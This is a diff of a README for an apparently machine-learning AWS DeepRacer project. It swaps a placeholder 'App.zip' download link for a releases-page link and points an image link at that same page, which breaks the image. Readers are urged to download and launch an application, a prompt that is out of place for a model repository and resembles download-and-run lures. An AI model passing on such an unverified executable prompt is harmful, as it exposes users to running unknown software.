@@ -24,7 +24,7 @@ As we continue to refine our AWS DeepRacer model, we remain committed to explori
 
 If you are ready to explore the world of autonomous racing and dive into the details of our DeepRacer model, we invite you to check out the project repository. Feel free to clone the code, experiment with the implementation, and contribute to the evolution of our autonomous racing solution. Let's revolutionize the future of racing together!
 
-🔗 **[Download the App](https://github.com/repo/releases/9246/App.zip)** 🏁
+🔗 **[Download the App](https://github.com/Gummala-vinaykumar/AWS-DeepRacer-Autonomous-Racing-Model/releases)** 🏁
 
 If the link ends with a file name, make sure to launch the application to experience the magic of autonomous racing firsthand. 🏎️💨
 
@@ -32,7 +32,7 @@ For more updates and releases, please visit the "Releases" section of the reposi
 
 Let's accelerate into the future with our AWS DeepRacer Autonomous Racing Model! 🏆🔥
 
-![DeepRacer Image](https://example.com/deepracer.png)
+![DeepRacer Image](https://github.com/Gummala-vinaykumar/AWS-DeepRacer-Autonomous-Racing-Model/releases)
 
 ---
 #### Tags: *aws-infrastructure, deep-learning, deployment, hyperparameter-tuning, machine-learning, ppo-algorithm, python, scalable, tensorflow, training*
